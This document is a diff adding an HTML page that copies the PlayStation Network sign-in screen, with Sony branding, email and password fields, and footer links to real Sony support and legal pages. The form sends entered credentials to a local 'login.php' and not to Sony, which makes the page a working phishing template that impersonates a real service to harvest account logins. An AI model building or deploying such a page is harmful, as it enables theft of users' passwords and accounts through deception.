@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In | PlayStation</title>
+    <link rel="icon" type="image/png" href="logo_playstation.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "SST W20 Roman", Arial, sans-serif;
+            background: linear-gradient(135deg, #003087 0%, #001a4d 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 100%;
+            padding: 40px 30px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 200px;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #000;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #000;
+            margin-bottom: 8px;
+        }
+
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 16px;
+            border: 2px solid #d1d1d1;
+            border-radius: 4px;
+            transition: all 0.3s;
+            background: white;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #0070d1;
+            box-shadow: 0 0 0 3px rgba(0, 112, 209, 0.1);
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 5px;
+            color: #666;
+        }
+
+        .toggle-password:hover {
+            color: #0070d1;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: #0070d1;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover {
+            background: #0061b8;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 112, 209, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .forgot-password a {
+            color: #0070d1;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            position: relative;
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 50%;
+            height: 1px;
+            background: #d1d1d1;
+        }
+
+        .divider span {
+            position: relative;
+            background: white;
+            padding: 0 15px;
+            color: #666;
+            font-size: 14px;
+        }
+
+        .create-account {
+            text-align: center;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 4px;
+            margin-top: 20px;
+        }
+
+        .create-account p {
+            margin-bottom: 15px;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .btn-secondary {
+            display: inline-block;
+            padding: 12px 30px;
+            background: white;
+            color: #0070d1;
+            border: 2px solid #0070d1;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .btn-secondary:hover {
+            background: #0070d1;
+            color: white;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: white;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            background: #fee;
+            border: 1px solid #fcc;
+            color: #c33;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 24px;
+            }
+
+            .logo img {
+                width: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="logo_playstation.png" alt="PlayStation">
+        </div>
+
+        <h1>Sign In</h1>
+
+        <div class="error-message" id="errorMessage"></div>
+
+        <form action="login.php" method="POST" id="loginForm">
+            <div class="form-group">
+                <label for="email">Sign-In ID (Email Address)</label>
+                <input 
+                    type="email" 
+                    id="email" 
+                    name="username" 
+                    placeholder="Enter your email" 
+                    required
+                    autocomplete="email"
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <div class="password-container">
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password" 
+                        placeholder="Enter your password" 
+                        required
+                        autocomplete="current-password"
+                    >
+                    <button type="button" class="toggle-password" onclick="togglePassword()">
+                        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                            <circle cx="12" cy="12" r="3"></circle>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-primary">Sign In</button>
+
+            <div class="forgot-password">
+                <a href="https://id.sonyentertainmentnetwork.com/signin/forgot_password/">Trouble Signing In?</a>
+            </div>
+        </form>
+
+        <div class="divider">
+            <span>New to PlayStation Network?</span>
+        </div>
+
+        <div class="create-account">
+            <p>Create an account to get started</p>
+            <a href="https://id.sonyentertainmentnetwork.com/create_account/" class="btn-secondary">Create New Account</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        <a href="https://www.playstation.com/legal/terms-of-use/">Terms of Service</a>
+        <a href="https://www.playstation.com/legal/privacy-policy/">Privacy Policy</a>
+        <a href="https://support.playstation.com/">Support</a>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const eyeIcon = document.getElementById('eyeIcon');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
+            } else {
+                passwordInput.type = 'password';
+                eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                e.preventDefault();
+                const errorMsg = document.getElementById('errorMessage');
+                errorMsg.textContent = 'Please enter your email and password.';
+                errorMsg.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
